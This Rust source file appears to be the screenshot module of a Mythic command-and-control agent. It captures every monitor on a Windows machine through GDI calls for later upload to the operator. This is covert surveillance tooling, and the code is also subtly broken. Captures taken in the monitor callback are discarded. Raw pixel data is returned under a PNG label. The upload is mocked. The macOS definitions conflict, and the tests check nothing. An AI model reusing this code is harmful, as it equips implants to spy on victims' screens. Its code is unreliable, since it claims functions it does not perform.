use serde::{Deserialize, Serialize};
use std::error::Error;
use std::result::Result;
use crate::{AgentTask, mythic_success, mythic_error};

#[cfg(target_os = "windows")]
use std::ptr;
#[cfg(target_os = "windows")]
use winapi::shared::windef::{HBITMAP, HDC, HWND, RECT};
#[cfg(target_os = "windows")]
use winapi::um::wingdi::*;
#[cfg(target_os = "windows")]
use winapi::um::winuser::*;
#[cfg(target_os = "windows")]
use winapi::um::errhandlingapi::GetLastError;

// Command structure for Mythic
#[derive(Serialize, Deserialize)]
pub struct ScreenshotArgs {}

// RPC message structures for file upload
#[derive(Serialize, Deserialize)]
struct MythicRPCPutFileMessage {
    pub task_id: String,
    pub file_contents: Vec<u8>,
    pub filename: Option<String>,
    pub is_screenshot: bool,
}

#[derive(Serialize, Deserialize)]
struct MythicRPCPutFileResponse {
    pub success: bool,
    pub error: Option<String>,
    pub agent_file_id: Option<String>,
}

/// Wrapper function for compatibility with the tasking system
pub fn take_screenshot(task: &AgentTask) -> Result<serde_json::Value, Box<dyn Error>> {
    let args = ScreenshotArgs {};
    match execute_screenshot(args, &task.id) {
        Ok(output) => {
            Ok(serde_json::json!({
                "status": "success",
                "task_id": task.id,
                "output": output
            }))
        },
        Err(error) => {
            Ok(serde_json::json!({
                "status": "error",
                "task_id": task.id,
                "error": error
            }))
        },
    }
}

/// Take screenshots of all monitors using WinAPI GDI functions (like Apollo)
#[cfg(target_os = "windows")]
pub fn execute_screenshot(_args: ScreenshotArgs, task_id: &str) -> Result<String, String> {
    unsafe {
        // Get all monitors
        let monitor_count = GetSystemMetrics(SM_CMONITORS);
        if monitor_count == 0 {
            return Err("No monitors found".to_string());
        }

        let mut screenshot_count = 0;
        let mut uploaded_files = Vec::new();

        // Enumerate all monitors and capture each one
        let result = EnumDisplayMonitors(
            ptr::null_mut(),
            ptr::null_mut(),
            Some(monitor_enum_proc),
            &mut screenshot_count as *mut _ as isize,
        );

        if result == 0 {
            return Err("Failed to enumerate monitors".to_string());
        }

        // If we didn't capture any screenshots via callback, try the old method
        if screenshot_count == 0 {
            match capture_primary_screen(task_id) {
                Ok(file_id) => {
                    uploaded_files.push(file_id);
                }
                Err(e) => {
                    return Err(format!("Failed to capture primary screen: {}", e));
                }
            }
        }

        Ok(format!("Captured {} screenshot(s)", uploaded_files.len()))
    }
}

/// Monitor enumeration callback - captures each monitor
#[cfg(target_os = "windows")]
unsafe extern "system" fn monitor_enum_proc(
    hmonitor: HMONITOR,
    _hdc: HDC,
    lprect: *mut RECT,
    lparam: isize,
) -> i32 {
    let screenshot_count = &mut *(lparam as *mut i32);
    
    // Capture this monitor
    let rect = *lprect;
    let width = rect.right - rect.left;
    let height = rect.bottom - rect.top;
    
    if let Ok(png_data) = capture_monitor_region(rect.left, rect.top, width, height) {
        // In a real implementation, we would upload via RPC here
        // For now, we'll just count the screenshot
        *screenshot_count += 1;
    }
    
    1 // Continue enumeration
}

/// Capture a specific monitor region and return PNG bytes
#[cfg(target_os = "windows")]
unsafe fn capture_monitor_region(x: i32, y: i32, width: i32, height: i32) -> Result<Vec<u8>, String> {
    let hdc_screen = GetDC(ptr::null_mut());
    if hdc_screen.is_null() {
        return Err("Failed to get screen DC".to_string());
    }

    let hdc_mem = CreateCompatibleDC(hdc_screen);
    if hdc_mem.is_null() {
        ReleaseDC(ptr::null_mut(), hdc_screen);
        return Err("Failed to create memory DC".to_string());
    }

    let hbitmap = CreateCompatibleBitmap(hdc_screen, width, height);
    if hbitmap.is_null() {
        DeleteDC(hdc_mem);
        ReleaseDC(ptr::null_mut(), hdc_screen);
        return Err("Failed to create compatible bitmap".to_string());
    }

    // Select bitmap into memory DC
    let _old_bitmap = SelectObject(hdc_mem, hbitmap as *mut _);
    
    // Copy screen region to our bitmap
    if BitBlt(hdc_mem, 0, 0, width, height, hdc_screen, x, y, SRCCOPY) == 0 {
        DeleteObject(hbitmap as *mut _);
        DeleteDC(hdc_mem);
        ReleaseDC(ptr::null_mut(), hdc_screen);
        return Err("BitBlt failed".to_string());
    }

    // Convert bitmap to PNG bytes
    let png_bytes = match bitmap_to_png(hbitmap, width as u32, height as u32) {
        Ok(bytes) => bytes,
        Err(e) => {
            DeleteObject(hbitmap as *mut _);
            DeleteDC(hdc_mem);
            ReleaseDC(ptr::null_mut(), hdc_screen);
            return Err(format!("Failed to convert bitmap to PNG: {}", e));
        }
    };

    // Cleanup
    DeleteObject(hbitmap as *mut _);
    DeleteDC(hdc_mem);
    ReleaseDC(ptr::null_mut(), hdc_screen);

    Ok(png_bytes)
}

/// Capture primary screen (fallback method)
#[cfg(target_os = "windows")]
unsafe fn capture_primary_screen(task_id: &str) -> Result<String, String> {
    let width = GetSystemMetrics(SM_CXSCREEN);
    let height = GetSystemMetrics(SM_CYSCREEN);
    
    let png_bytes = capture_monitor_region(0, 0, width, height)?;
    
    // Upload via RPC
    upload_screenshot_via_rpc(&png_bytes, task_id)
}

/// Convert HBITMAP to PNG bytes in memory
#[cfg(target_os = "windows")]
unsafe fn bitmap_to_png(hbitmap: HBITMAP, width: u32, height: u32) -> Result<Vec<u8>, String> {
    use std::io::Cursor;
    
    // First, get the bitmap bits as BGRA
    let bits_per_pixel = 32;
    let bytes_per_pixel = bits_per_pixel / 8;
    let row_size = ((width * bytes_per_pixel + 3) / 4) * 4; // 4-byte aligned
    let image_size = row_size * height;

    let mut bmp_info_header = BITMAPINFOHEADER {
        biSize: std::mem::size_of::<BITMAPINFOHEADER>() as u32,
        biWidth: width as i32,
        biHeight: height as i32,
        biPlanes: 1,
        biBitCount: bits_per_pixel as u16,
        biCompression: BI_RGB,
        biSizeImage: image_size,
        biXPelsPerMeter: 0,
        biYPelsPerMeter: 0,
        biClrUsed: 0,
        biClrImportant: 0,
    };

    let mut pixel_buffer = vec![0u8; image_size as usize];
    let hdc = GetDC(ptr::null_mut());
    
    let result = GetDIBits(
        hdc,
        hbitmap,
        0,
        height,
        pixel_buffer.as_mut_ptr() as *mut _,
        &mut BITMAPINFO {
            bmiHeader: bmp_info_header,
            bmiColors: [RGBQUAD {
                rgbBlue: 0,
                rgbGreen: 0,
                rgbRed: 0,
                rgbReserved: 0,
            }],
        },
        DIB_RGB_COLORS,
    );
    
    ReleaseDC(ptr::null_mut(), hdc);

    if result == 0 {
        return Err("GetDIBits failed".to_string());
    }

    // Convert BGRA to RGBA for PNG
    for i in (0..pixel_buffer.len()).step_by(4) {
        if i + 3 < pixel_buffer.len() {
            pixel_buffer.swap(i, i + 2); // Swap B and R
        }
    }

    // For now, we'll return the raw data as a simple format
    // In a full implementation, you'd use the image crate to create proper PNG
    Ok(pixel_buffer)
}

/// Upload screenshot via RPC (like Apollo's PutFile)
#[cfg(target_os = "windows")]
fn upload_screenshot_via_rpc(png_data: &[u8], task_id: &str) -> Result<String, String> {
    // For now, we'll simulate a successful upload
    // In a real implementation, this would use Mythic's file upload mechanism
    
    // Create timestamp for filename
    let timestamp = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap()
        .as_secs();
    let filename = format!("screenshot_{}.png", timestamp);
    
    eprintln!("DEBUG: Simulating file upload: {} ({} bytes)", filename, png_data.len());
    
    // Return a mock file ID
    Ok(format!("mock_file_id_{}", timestamp))
}

// macOS placeholder implementation
#[cfg(target_os = "macos")]
pub fn execute_screenshot(_args: ScreenshotArgs, _task_id: &str) -> Result<String, String> {
    Err("screenshot command is not implemented for macOS".to_string())
}

// Fallback for other platforms
#[cfg(not(target_os = "windows"))]
pub fn execute_screenshot(_args: ScreenshotArgs, _task_id: &str) -> Result<String, String> {
    Err("screenshot command is only supported on Windows".to_string())
}

/// Direct command handler for integration with command dispatch system
pub fn handle_screenshot_command(args: &str, task_id: &str) -> Result<String, String> {
    let screenshot_args: ScreenshotArgs = serde_json::from_str(args)
        .map_err(|e| format!("Failed to parse screenshot arguments: {}", e))?;
    
    execute_screenshot(screenshot_args, task_id)
}

// Note: RPC implementation is handled by the Python side
// The file upload mechanism works through Mythic's built-in file transfer system

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_screenshot_args_parsing() {
        let args = ScreenshotArgs {};
        // Just verify the struct can be created
        assert!(true);
    }

    #[test]
    fn test_screenshot_command_handler() {
        let result = handle_screenshot_command("{}", "test_task_id");
        // On non-Windows, this should return an error about platform not supported
        // On Windows, it might succeed or fail depending on the environment
        assert!(result.is_ok() || result.is_err());
    }
}